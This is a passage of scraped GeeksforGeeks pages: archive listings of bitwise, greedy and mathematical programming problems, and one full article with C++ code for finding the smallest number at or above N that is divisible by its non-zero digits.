divisible by all… Read More » GreedyMathematicalnumber-digits Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N =… Read More » Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Make all array elements even by replacing any pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to make all array elements even by replacing any pair of array elements… Read More » ArraysMathematicalarray-rearrangefrequency-counting Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of… Read More » ArraysMathematicalSortingarray-rearrangesubarray Print path from a node to root of given Complete Binary Tree Last Updated: 20-12-2020 Given an integer N, the task is to find the path from the Nth node to the root of a Binary Tree of the following… Read More » GreedyMathematicalTreeDFSinterview-preparationNumbers Maximize the common difference of an AP having the given array as a subsequence Last Updated: 20-12-2020 Given a sorted array arr[] consisting of N distinct elements, the task is to find the maximum possible common difference of an arithmetic progression such… Read More » ArraysGreedyMathematicalarithmetic progressionArithmetic ProgressionsMaths Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Minimize the maximum difference of any pair by doubling odd elements and reducing even elements by half Last Updated: 20-12-2020 Given an array arr[] consisting of N positive integers, the task is to minimize the maximum difference between any pair of array elements by multiplying… Read More » ArraysHashMathematicalarray-rearrangecpp-setNatural Numbers Smallest number whose sum of digits is N and every digit occurring at most K times Last Updated: 20-12-2020 Given two positive integers N and K, the task is to find the smallest number whose sum of digits is N and every distinct digit… Read More » GreedyMathematicalnumber-digitsNumbers XOR of all even numbers from a given range Last Updated: 20-12-2020 5 Given two integers L and R, the task is to calculate Bitwise XOR of all even numbers in the range [L, R]. Examples: Example: Input:… Read More » Bit MagicMathematicalBitwise-XOR Count pairs of indices having equal prefix and suffix sums Last Updated: 20-12-2020 Given an array arr[] of length N, the task is to find the count of pairs of indices (i, j) (0-based indexing) such that prefix… Read More » ArraysHashMathematicalSearchingprefix-sumsubarraysubarray-sumsuffix-sum Queries to check if sweets of given type can be eaten on given day or not Last Updated: 19-12-2020 5 Given two arrays A[ ] and B[ ] consisting of N integers, where Ai denotes the quantity of sweets of the ith type and Bi… Read More » ArraysGreedyMathematicalSortingarray-range-queriescpp-paircpp-vector Minimum number of Cuboids required to form a Cube Last Updated: 19-12-2020 Given L, B, and H which denotes the length, breadth, and height of a cuboid, the task is to find the minimum number of cuboids… Read More » GeometricMathematicalarea-volume-programsGCD-LCMLCM Page 1 of 35112345...102030...»Last » Most popular in Mathematical Program for factorial of a numberComplexity Analysis of Binary SearchProgram to find sum of elements in a given arrayFind ways an Integer can be expressed as sum of n-th power of unique natural numbersGraph Types and Applications Most Visited in Mathematical How to swap two numbers without using a temporary variable?Adding two polynomials using Linked ListProgram to convert a given number to wordsWindow to Viewport Transformation in Computer Graphics with ImplementationFind if two rectangles overlap room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Bitwise-XOR Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Bitwise Operators in C/C++Find the Missing NumberHow to swap two numbers without using a temporary variable?Find the repeating and the missing | Added 3 new methodsFind the element that appears onceXOR Linked List - A Memory Efficient Doubly Linked List | Set 1Add two numbers without using arithmetic operatorsFind the Number Occurring Odd Number of TimesFind the element that appears once in an array where every other element appears twiceFind the two non-repeating elements in an array of repeating elements/ Unique Numbers 2Bitwise Hacks for Competitive ProgrammingFind XOR of two number without using XOR operatorCount number of bits to be flipped to convert A to BCalculate XOR from 1 to n.XOR Linked List – A Memory Efficient Doubly Linked List | Set 2Maximum XOR of Two Numbers in an ArrayGray to Binary and Binary to Gray conversionFind the maximum subarray XOR in a given arraySwap bits in a given numberFind two numbers from their sum and XORFind the maximum subset XOR of a given setMinimum XOR Value PairCount the number of subarrays having a given XORDetect if two integers have opposite signsCompute the minimum or maximum of two integers without branchingSwap two variables in one lineXOR CipherFind the only repetitive element between 1 to n-1Check if a Number is Odd or Even using Bitwise OperatorsFind the two numbers with odd occurrences in an unsorted array Tag Archives: Bitwise-XOR Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other… Read More » ArraysBit MagicMathematicalBitwise-XORsetBitCount XOR of all even numbers from a given range Last Updated: 21-12-2020 5 Given two integers L and R, the task is to calculate Bitwise XOR of all even numbers in the range [L, R]. Examples: Example: Input: L… Read More » Bit MagicMathematicalBitwise-XOR XOR Linked List – Find Nth Node from the end Last Updated: 17-12-2020 3 Given a XOR linked list and an integer N, the task is to print the Nth node from the end of the given XOR linked… Read More » Bit MagicData StructuresLinked ListBitwise-XOR XOR Linked List – Find the middle node Last Updated: 17-12-2020 3 Given an XOR linked list, the task is to find the middle node of the given XOR linked list. Examples: Input: 4 –> 7 –>… Read More » Bit MagicData StructuresLinked ListBitwise-XOR Construct original array starting with K from an array of XOR of all elements except elements at same index Last Updated: 17-12-2020 Given an array A[] consisting of N integers and first element of the array B[] as K, the task is to construct the array B[]… Read More » ArraysBit MagicBitwise-XOR Sum of the first N terms of XOR Fibonacci series Last Updated: 21-12-2020 Given three positive integers A, B, and N where A and B are the first two terms of the XOR Fibonacci series, the task is… Read More » MathematicalBitwise-XORFibonacciseries-sum Find, Set, Clear, Toggle and Modify bits in C Last Updated: 11-12-2020 3 Given a positive integer N, the task is to perform the following sequence of operations on the binary representation of N in C. Finding a… Read More » Bit MagicMathematicalTechnical ScripterBit AlgorithmsBitwise-ANDBitwise-ORBitwise-XORTechnical Scripter 2020 XOR Linked List – Insert an element at a specific position Last Updated: 10-12-2020 3.5 Given a XOR linked list and two integers position and value, the task is to insert a node containing value as the positionth node of… Read More » Bit MagicData StructuresLinked ListBitwise-XORLinked Lists Length of the longest subarray whose Bitwise XOR is K Last Updated: 21-12-2020 Given an array arr[] of size N and an integer K, the task is to find the length of the longest subarray having Bitwise XOR… Read More » ArraysBit MagicHashMathematicalBitwise-XORcpp-mapHashprefixsubarray Find the triplet from given Bitwise XOR and Bitwise AND values of all its pairs Last Updated: 10-12-2020 Given six positive integers representing the Bitwise XOR and Bitwise AND of all possible pairs of a triplet (a, b, c), the task is to… Read More » Bit MagicGreedyMathematicalBit AlgorithmsBitwise-ANDBitwise-XOR Find N distinct numbers whose Bitwise XOR is equal to K Last Updated: 16-12-2020 Given two positive integers N and X, the task is to construct N positive integers having Bitwise XOR of all these integers equal to K.… Read More » Bit MagicGreedyMathematicalBitwise-XOR Minimum value to be added to maximize Bitwise XOR of the given array Last Updated: 14-12-2020 Given an array arr[] consisting of N integers, the task is to find an integer K, not having more than maximum bits present in any… Read More » ArraysBit MagicMathematicalBitwise-XOR Calculate Bitwise OR of two integers from their given Bitwise AND and Bitwise XOR values Last Updated: 09-12-2020 Given two integers X and Y, representing Bitwise XOR and Bitwise AND of two positive integers, the task is to calculate the Bitwise OR value… Read More » Bit MagicGreedyMathematicalBit AlgorithmsBitwise-ANDBitwise-ORBitwise-XOR Count ways to make Bitwise XOR of odd and even indexed elements equal by removing an array element Last Updated: 09-12-2020 Given an array arr[] of length N, the task is to find the count of array indices such that removing an element from these indices… Read More » ArraysBit MagicGreedyMathematicalPattern SearchingBitwise-XOR Find two numbers from their sum and XOR | Set 2 Last Updated: 08-12-2020 3 Given two integers X and Y, the task is to find the two integers having sum X and Bitwise XOR equal to Y. Examples: Input:… Read More » Bit MagicData StructuresGreedyBitwise-XOR Page 1 of 2112345...1020...»Last » Most popular in Bitwise-XOR Find XOR of all elements in an ArrayFind one extra character in a stringSwap three variables without using temporary variableReverse string without using any temporary variableXOR of two Binary Strings Most visited in Bitwise-XOR Hamming distance between two IntegersXOR of all even numbers from a given rangeXOR of all subarray XORs | Set 1Equal Sum and XORFind One's Complement of an Integer room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

setBitCount Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Count set bits in an integerHamming distance between two IntegersCount total set bits in all numbers from 1 to n | Set 2Number of mismatching bits in the binary representation of two integersC program to count zeros and ones in binary representation of a numberCount total set bits in all numbers from 1 to N | Set 3Count total set bits in all numbers from range L to RProgram to invert bits of a number EfficientlyReduce a number to 1 by performing given operations | Set 2Find the Majority Element | Set 3 (Bit Magic)Count Set-bits of number using RecursionFind a number X such that (X XOR A) is minimum and the count of set bits in X and B are equalSort an array according to count of set bits | Set 2Maximum number of set bits count in a K-size substring of a Binary StringXOR of all elements of array with set bits equal to KMinimum bit flips such that every K consecutive bits contain at least one set bitMaximize count of 0s in left and 1s in right substring by splitting given Binary stringCount ordered pairs of positive numbers such that their sum is S and XOR is KNumber of values of b such that a = b + (a^b)Count ways to generate pairs having Bitwise XOR and Bitwise AND equal to X and Y respectivelyMinimum steps to reach the Nth stair in jumps of perfect power of 2Count numbers in range [L, R] having K consecutive set bitsCount number of bits changed after adding 1 to given NCount of binary strings of length N with even set bit count and at most K consecutive 1sGenerate first K multiples of N using Bitwise operatorsCheck if a number has same number of set and unset bitsCount pairs in an array such that both elements has equal set bitsSmallest number exceeding N whose Kth bit is setMinimize given flips required to reduce N to 0Count pairs with set bits sum equal to K Tag Archives: setBitCount Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other… Read More » ArraysBit MagicMathematicalBitwise-XORsetBitCount Sum of Bitwise OR of each array element of an array with all elements of another array Last Updated: 21-12-2020 Given two arrays arr1[] of size M and arr2[] of size N, the task is to find the sum of bitwise OR of each element… Read More » ArraysBit MagicprefixsetBitCount Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N =… Read More » Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Minimize given flips required to reduce N to 0 Last Updated: 04-12-2020 Given an integer N, the task is to reduce the value of N to 0 by performing the following operations minimum number of times: Flip… Read More » Bit MagicDynamic ProgrammingMathematicalRecursionmaths-powersetBitCount Program to find the Nth natural number with exactly two bits set | Set 2 Last Updated: 15-12-2020 Given an integer N, the task is to find the Nth natural number with exactly two set bits. Examples: Input: N = 4Output: 9Explanation: Numbers… Read More » Bit MagicMathematicalSearchingsetBitCount Count numbers in range [L, R] having K consecutive set bits Last Updated: 14-12-2020 Given three positive integers L, R, and K, the task is to find the count of numbers in the range [L, R] having K consecutive… Read More » Bit MagicDynamic ProgrammingMathematicalRecursionbinary-representationdigit-DPsetBitCount Count pairs whose sum consists of set bits only Last Updated: 26-10-2020 Given an array arr[] consisting of N integers, the task is to find the count of unordered pairs in the given array whose sum contains… Read More » ArraysBit MagicCombinatorialHashMathematicalcpp-mapfrequency-countingsetBitCount Number of pairs whose product is a power of 2 Last Updated: 23-10-2020 Given an array arr[] consisting of N integers, the task is to count the total number of pairs of array elements from the given array… Read More » ArraysCombinatorialGreedyMathematicalPattern Searchingcombionatricsmaths-powernumber-theorysetBitCount Count positions in Binary Matrix having equal count of set bits in corresponding row and column Last Updated: 07-10-2020 3 Given a boolean matrix mat[][] of size M * N, the task is to print the count of indices from the matrix whose corresponding row… Read More » HashMatrixSearchingbinary-representationfrequency-countingsetBitCount Smallest number exceeding N whose Kth bit is set Last Updated: 16-10-2020 Given two integers N and K, the task is to find the smallest number greater than N whose Kth bit in its binary representation is… Read More » Bit MagicGreedyMathematicalBit AlgorithmssetBitCount Check if array can be sorted by swapping pairs with GCD of set bits count equal to that of the smallest array element Last Updated: 25-09-2020 Given an array arr[] consisting of N integers, the task is to check if it is possible to sort the array using the following swap… Read More » ArraysBit MagicMathematicalSearchingSortingHCFsetBitCount Count ways to generate pairs having Bitwise XOR and Bitwise AND equal to X and Y respectively Last Updated: 24-09-2020 3 Given two integers X and Y, the task is to find the total number of ways to generate a pair of integers A and B… Read More » Bit MagicGreedyMathematicalBitwise-ANDBitwise-XORsetBitCount Count of numbers having only one unset bit in a range [L,R] Last Updated: 22-09-2020 Given two integers L and R, the task is to count the numbers having only one unset bit in the range [L, R]. Examples: Input:… Read More » Bit MagicGreedyMathematicalSearchingbinary-representationsetBitCount Count of Binary Strings of length N such that frequency of 1’s exceeds frequency of 0’s Last Updated: 18-08-2020 Given an integer N, the task is to find the number of Binary Strings of length N such that frequency of 1‘s is greater than… Read More » Bit MagicCombinatorialMathematicalStringsbinary-stringfrequency-countingsetBitCount Page 1 of 512345» Most popular in setBitCount Sum of maximum of all subarrays by adding even frequent maximum twiceSum of Bitwise XOR of each array element with all other array elementsCount odd and even Binomial Coefficients of N-th powerSum of Bitwise OR of each array element of an array with all elements of another arrayFind all powers of 2 less than or equal to a given number Most visited in setBitCount Number formed by flipping all bits to the left of rightmost set bitMaximum number of contiguous array elements with same number of set bitsGenerate an Array such with elements maximized through swapping bitsNumber of pairs whose product is a power of 2Count of pairs in an Array with same number of set bits room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Smallest number greater than or equal to N which is divisible by its non-zero digits - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Dijkstra's shortest path algorithm | Greedy Algo-7Program for array rotationPrim’s Minimum Spanning Tree (MST) | Greedy Algo-5Kruskal’s Minimum Spanning Tree Algorithm | Greedy Algo-2Write a program to print all permutations of a given stringCoin Change | DP-7Huffman Coding | Greedy Algo-3Activity Selection Problem | Greedy Algo-1Minimum Number of Platforms Required for a Railway/Bus StationFractional Knapsack ProblemJob Sequencing ProblemDijkstra’s Algorithm for Adjacency List Representation | Greedy Algo-8Program for Shortest Job First (or SJF) CPU Scheduling | Set 1 (Non- preemptive)Rearrange characters in a string such that no two adjacent are sameGreedy Algorithm to find Minimum number of CoinsDelete an element from array (Using two traversals and one traversal)Minimize the maximum difference between the heightsProgram for Least Recently Used (LRU) Page Replacement algorithmPrim’s MST for Adjacency List Representation | Greedy Algo-6Applications of Minimum Spanning Tree ProblemMinimum Cost Path with Left, Right, Bottom and Up moves allowedConnect n ropes with minimum costProgram for Shortest Job First (SJF) scheduling | Set 2 (Preemptive)Minimum cost to connect all citiesMaximum Length Chain of Pairs | DP-20Graph Coloring | Set 2 (Greedy Algorithm)Huffman DecodingProgram for Page Replacement Algorithms | Set 2 (FIFO)Difference between Prim's and Kruskal's algorithm for MSTPractice Questions on Huffman Encoding Smallest number greater than or equal to N which is divisible by its non-zero digits Last Updated: 21-12-2020 Given an integer N, the task is to find the smallest number greater than or equal to N such that it is divisible by all of its non-zero digits. Examples: Input: N = 31Output: 33Explanation: 33 is the smallest number satisfying the given condition. At Unit’s place: 33%3 = 0At One’s place: 33%3 = 0 Input: N = 30Output: 30Explanation: 30 is the smallest number satisfying the given condition. At One’s place: 30%3 = 0 Approach: Smallest number which is divisible by all digits from 1 to 9 is equal to the LCM of (1, 2, 3, 4, 5, 6, 7, 8, 9) = 2520. Therefore, the multiples of 2520 are also divisible by all digits from 1 to 9 implying that (N + 2520) will always satisfy the condition. Therefore, iterate in the range [N, 2520 + N] and check for the smallest number satisfying the given condition. Follow the steps below to solve the problem: Initialize ans as 0 to store the smallest number greater than or equal to N such that it is divisible by all its non-zero digits. Iterate over the range [N, N + 2520] using the variable i. Initialize a variable possible as 1 to check if the current number i satisfies the given condition or not. Get all non-zero digits of i and check if i is divisible by each of them. If found to be true, then update possible to 1, and update ans as i, and break out of the loop. After the above steps, print the value of ans as the result. Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // Function to find the smallest number // greater than or equal to N such that // it is divisible by its non-zero digits void findSmallestNumber(int n) { // Iterate in range[N, N + 2520] for (int i = n; i <= (n + 2520); ++i) { // To check if the current number // satisfies the given condition bool possible = 1; // Store the number in a temporary // variable int temp = i; // Loop until temp > 0 while (temp) { // Check only for non zero digits if (temp % 10 != 0) { // Extract the current digit int digit = temp % 10; // If number is divisible // by current digit or not if (i % digit != 0) { // Otherwise, set // possible to 0 possible = 0; // Break out of the loop break; } } // Divide by 10 temp /= 10; } if (possible == 1) { cout << i; return; } } } // Driver Code int main() { int N = 31; // Function Call findSmallestNumber(N); return 0; } chevron_right filter_none Output: 33 Time Complexity: O(2520*log10N)Auxiliary Space: O(1) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Smallest number greater than or equal to X whose sum of digits is divisible by YLargest number not greater than N which can become prime after rearranging its digitsSmallest subarray of size greater than K with sum greater than a given valueSmallest number greater than or equal to N divisible by KSmallest number greater than or equal to N using only digits 1 to KSmallest number greater than or equal to N having sum of digits not exceeding SSmallest number greater than Y with sum of digits equal to XSmallest Special Prime which is greater than or equal to a given numberHighest and Smallest power of K less than and greater than equal to N respectivelyFind N numbers such that a number and its reverse are divisible by sum of its digitsSmallest N digit number with none of its digits as its divisorCheck if the sum of digits of number is divisible by all of its digitsCount of Array elements greater than all elements on its left and next K elements on its rightCount of Array elements greater than all elements on its left and at least K elements on its rightLargest number not greater than N all the digits of which are oddSmallest number greater than X which is K-periodicLargest number with maximum trailing nines which is less than N and greater than N-DSum of the digits of square of the given number which has only 1's as its digitsCount of array elements which are greater than all elements on its leftCount numbers in given range such that sum of even digits is greater than sum of odd digitsshreyasshetty788Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : GreedyMathematicalnumber-digits Practice Tags : GreedyMathematical thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Count odd and even Binomial Coefficients of N-th power Next last_page Sum of Bitwise XOR of each array element with all other array elements Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Greedy Proof that traveling salesman problem is NP Hard3 Different ways to print Fibonacci series in JavaGreedy approach vs Dynamic programmingFind the sum of digits of a number at even and odd placesMax Flow Problem Introduction Most visited in Mathematical Program for Fibonacci numbersC++ Data TypesProgram for factorial of a numberSet in C++ Standard Template Library (STL)Prime Numbers room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Greedy Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Dijkstra's shortest path algorithm | Greedy Algo-7Program for array rotationPrim’s Minimum Spanning Tree (MST) | Greedy Algo-5Kruskal’s Minimum Spanning Tree Algorithm | Greedy Algo-2Write a program to print all permutations of a given stringCoin Change | DP-7Huffman Coding | Greedy Algo-3Activity Selection Problem | Greedy Algo-1Minimum Number of Platforms Required for a Railway/Bus StationFractional Knapsack ProblemJob Sequencing ProblemDijkstra’s Algorithm for Adjacency List Representation | Greedy Algo-8Program for Shortest Job First (or SJF) CPU Scheduling | Set 1 (Non- preemptive)Rearrange characters in a string such that no two adjacent are sameGreedy Algorithm to find Minimum number of CoinsDelete an element from array (Using two traversals and one traversal)Minimize the maximum difference between the heightsProgram for Least Recently Used (LRU) Page Replacement algorithmPrim’s MST for Adjacency List Representation | Greedy Algo-6Applications of Minimum Spanning Tree ProblemMinimum Cost Path with Left, Right, Bottom and Up moves allowedConnect n ropes with minimum costProgram for Shortest Job First (SJF) scheduling | Set 2 (Preemptive)Minimum cost to connect all citiesMaximum Length Chain of Pairs | DP-20Graph Coloring | Set 2 (Greedy Algorithm)Huffman DecodingProgram for Page Replacement Algorithms | Set 2 (FIFO)Difference between Prim's and Kruskal's algorithm for MSTPractice Questions on Huffman Encoding Category Archives: Greedy Smallest number greater than or equal to N which is divisible by its non-zero digits Last Updated: 21-12-2020 Given an integer N, the task is to find the smallest number greater than or equal to N such that it is divisible by all… Read More » GreedyMathematicalnumber-digits Print path from a node to root of given Complete Binary Tree Last Updated: 20-12-2020 Given an integer N, the task is to find the path from the Nth node to the root of a Binary Tree of the following… Read More » GreedyMathematicalTreeDFSinterview-preparationNumbers Maximize the common difference of an AP having the given array as a subsequence Last Updated: 20-12-2020 Given a 